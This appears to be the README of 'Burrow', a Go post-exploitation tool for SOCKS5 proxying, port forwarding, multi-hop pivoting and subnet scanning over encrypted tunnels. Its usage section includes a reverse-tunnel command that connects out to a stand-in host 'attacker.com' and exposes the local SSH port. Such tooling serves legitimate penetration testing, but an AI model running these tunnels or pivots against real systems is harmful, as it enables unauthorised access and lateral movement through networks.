# Burrow

One-command network pivoting, tunneling, and SOCKS5 proxy. v1.0.0.

## Overview

Burrow is a static Go binary for post-exploitation network traversal. It provides SOCKS5 proxying, local/remote/reverse TCP port forwarding, multi-hop pivot orchestration, and subnet scanning. All tunnel traffic is encrypted with X25519 key exchange and ChaCha20-Poly1305 or AES-256-GCM frame encryption. The binary is fully self-contained at ~4.2MB with no runtime dependencies.

## Install / Build

Requires Go 1.23+.

```bash
~/go-sdk/go/bin/go build -o burrow ./cmd/burrow/
```

## Usage

```bash
# SOCKS5 proxy
burrow proxy socks5 --listen 127.0.0.1:1080
burrow proxy socks5 --listen 0.0.0.0:9050 --auth user:pass

# Local port forward (listen locally, forward to remote)
burrow tunnel local --listen 127.0.0.1:8080 --remote 10.0.0.5:80

# Remote port forward (listen on remote, forward back locally)
burrow tunnel remote --listen 0.0.0.0:9090 --remote 192.168.1.10:22

# Reverse tunnel with auto-reconnect
burrow tunnel reverse --connect attacker.com:4444 --forward 127.0.0.1:22

# Multi-hop pivot chain
burrow pivot --target 10.0.0.1 --port 8443

# Network discovery
burrow scan --subnet 10.0.0.0/24
```

## Testing

```bash
~/go-sdk/go/bin/go test ./...
```

33/33 tests pass.

## Architecture

```
cmd/burrow/cmd/     CLI subcommands (cobra)
internal/
  crypto/           X25519 ECDH + ChaCha20-Poly1305/AES-256-GCM frame encryption
  proxy/            SOCKS5 server (RFC 1928)
  tunnel/           Local, remote, and reverse TCP forwarders
  pivot/            Multi-hop chain orchestration
  discovery/        Ping sweep + port scanner
```

Key rotation happens every hour. Frames carry a 4-byte counter for anti-replay tracking. The crypto package is WireGuard-style: X25519 ECDH for key exchange, HKDF-SHA256 for key derivation, then AEAD per frame.

## Tech Stack

- Go 1.23
- github.com/spf13/cobra (CLI)
- golang.org/x/crypto (X25519, ChaCha20-Poly1305, HKDF)
- Module: github.com/loudmumble/burrow
